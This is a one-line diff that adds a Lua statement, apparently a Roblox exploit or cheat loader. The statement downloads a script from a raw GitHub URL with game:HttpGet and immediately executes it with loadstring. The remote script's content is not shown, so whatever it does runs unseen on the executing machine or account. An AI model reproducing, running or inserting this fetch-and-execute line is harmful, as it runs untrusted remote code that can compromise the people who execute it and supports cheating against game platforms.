@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/rainy-valley-spam7-pe6s4pxtjpkn1w.lua"))()
